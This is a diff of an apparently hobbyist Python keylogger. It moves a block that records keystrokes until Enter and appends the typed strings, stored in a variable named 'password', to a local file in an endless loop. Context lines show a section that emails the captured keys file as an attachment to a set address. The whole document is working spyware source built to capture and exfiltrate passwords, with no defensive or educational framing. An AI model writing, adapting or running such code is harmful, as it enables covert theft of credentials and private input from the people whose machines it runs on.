@@ -1,29 +1,3 @@
-# ===================================================== Basic keylogger ================================================
-
-
-import keyboard
-import os
-
-
-# Defining the text file name and path
-path = os.path.abspath("keysniffer_data.txt")
-
-
-try:
-    while True:
-        with open(path, "a") as data_file:
-
-            # All key presses are recorded as a list into "events"
-            # and the record loop stops when the "enter" key is pressed
-            events = keyboard.record("enter")
-            password = list(keyboard.get_typed_strings(events))
-
-            data_file.write("\n")  # New line written before data is written
-            data_file.write(password[0])
-except KeyboardInterrupt:
-    print("Keylogger stopped.")
-
-
 # ===================================================== Sending by email =========================================================
 
 
@@ -98,3 +72,29 @@ def send_email(filename, attachment, toaddr):
 
 
 send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+
+# ===================================================== Basic keylogger ================================================
+
+
+import keyboard
+import os
+
+
+# Defining the text file name and path
+path = os.path.abspath("keysniffer_data.txt")
+
+
+try:
+    while True:
+        with open(path, "a") as data_file:
+
+            # All key presses are recorded as a list into "events"
+            # and the record loop stops when the "enter" key is pressed
+            events = keyboard.record("enter")
+            password = list(keyboard.get_typed_strings(events))
+
+            data_file.write("\n")  # New line written before data is written
+            data_file.write(password[0])
+except KeyboardInterrupt:
+    print("Keylogger stopped.")
